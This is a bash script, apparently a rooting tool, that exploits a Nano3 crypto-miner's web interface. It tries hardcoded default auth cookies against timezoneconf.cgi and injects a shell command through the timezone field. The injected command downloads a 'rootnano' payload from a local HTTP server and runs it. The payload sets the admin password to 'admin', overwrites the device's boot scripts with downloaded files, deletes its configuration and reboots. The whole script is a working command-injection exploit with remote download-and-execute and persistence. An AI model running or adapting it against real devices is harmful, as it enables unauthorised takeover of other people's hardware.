#!/bin/bash

# ========================
# Configuration
# ========================
SERVER_PORT=8080
LOCAL_IP=$(hostname -I | awk '{print $1}')  # local IP of your PC
BASE_DIR="$(dirname "$0")"                  # directory where this script is located
TOOLS_DIR="$BASE_DIR/tools"
SCRIPT_PATH="$TOOLS_DIR/rootnano"
DEST_DIR="/etc/init.d"
# ========================
# Verify tools folder and required files
# ========================
if [ ! -d "$TOOLS_DIR" ]; then
    echo "ERROR: the directory $TOOLS_DIR does not exist"
    echo "Create a 'tools' folder next to this script and place rcS and S99btcminer inside."
    exit 1
fi

if [ ! -f "$TOOLS_DIR/rcS" ]; then
    echo "ERROR: $TOOLS_DIR/rcS not found"
    exit 1
fi

if [ ! -f "$TOOLS_DIR/S99btcminer" ]; then
    echo "ERROR: $TOOLS_DIR/S99btcminer not found"
    exit 1
fi

echo "Detected rcS and S99btcminer in $TOOLS_DIR"

# ========================
# Ask for the Nano3 device IP
# ========================
while [[ -z "$NANO3_IP" ]]; do
    read -p "Enter the Nano3 device IP: " NANO3_IP
done

# ========================
# rootnano payload running on the miner
# ========================
cat << EOF > "$SCRIPT_PATH"
#!/bin/sh

LOG_FILE="/opt/pwned.log"

log() {
    echo "[\$(date '+%Y-%m-%d %H:%M:%S')] \$1" >> "\$LOG_FILE"
}

log "=== rootnano started from $LOCAL_IP ==="

# Set admin password to "admin"
echo -ne "admin\nadmin\n" | passwd admin >/dev/null 2>&1
log "Admin password changed to 'admin'."

# Generate ED25119 SSH key
yes | ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N '' >/dev/null 2>&1
log "Hostkey SSH ed25519 generated."

# --------- COPY TOOLS FILES ---------
#DEST_DIR="/etc/init.d"

# Download and overwrite custom rcS
if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/rcS -O "$DEST_DIR/rcS"; then
    chmod +x "$DEST_DIR/rcS"
    log "rcS installed from tools (no backup)."
else
    log "ERROR: Could not download rcS."
fi

# Download and overwrite custom S50watchdog
if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/S50watchdog -O "$DEST_DIR/S50watchdog"; then
    chmod +x "$DEST_DIR/S50watchdog"
    log "watchdog installed from tools."
else
    log "ERROR: Could not download Watchdog."
fi

# Download and copy S99btcminer
if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/S99btcminer -O "$DEST_DIR/S99btcminer"; then
    chmod +x "$DEST_DIR/S99btcminer"
    log "S99btcminer installed from tools."
else
    log "ERROR: S99btcminer could not be downloaded."
fi
log "Restarting the miner..."
rm /data/usrcon/cgminer.ini
rm /data/usrcon/systemcfg.ini
sync
reboot
EOF

chmod +x "$SCRIPT_PATH"

# ========================
# Start HTTP server to serve rootnano and tools/
# ========================
cd "$BASE_DIR"
echo "Starting server at http://$LOCAL_IP:$SERVER_PORT/"
python3 -m http.server $SERVER_PORT >/dev/null 2>&1 &
SERVER_PID=$!

sleep 2  # give the server a moment to start

# ========================
# Attempt exploit with possible auth keys
# ========================
AUTH_KEYS=(
  "ff0000ff4813494d137e1631bba301d5"  # default one
  "ff0000ffe489f84c23a6fbd9017f631a"  # alternative auth key
)

SUCCESS=0
for AUTH in "${AUTH_KEYS[@]}"; do
    echo "Testing exploit with auth=$AUTH ..."
    RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/curl.out \
      "http://$NANO3_IP/timezoneconf.cgi" \
      -b "auth=$AUTH" \
      --data-raw "timezone=%3Bwget%20http%3A%2F%2F$LOCAL_IP%3A$SERVER_PORT%2Ftools%2Frootnano%20-O%20%2Ftmp%2Frootnano%3Bsh%20%2Ftmp%2Frootnano%3B")

    if [ "$RESPONSE" = "200" ]; then
        echo "Exploit launched successfully with auth=$AUTH"
        SUCCESS=1
        break
    else
        echo "Failed with auth=$AUTH (HTTP $RESPONSE), trying next..."
    fi
done

# ========================
# Stop HTTP server
# ========================
kill $SERVER_PID 2>/dev/null || true
echo "Server stopped."

if [ $SUCCESS -eq 1 ]; then
    echo "The miner should reboot in a few seconds..."
else
    echo "None of the auth keys worked, check manually."
fi
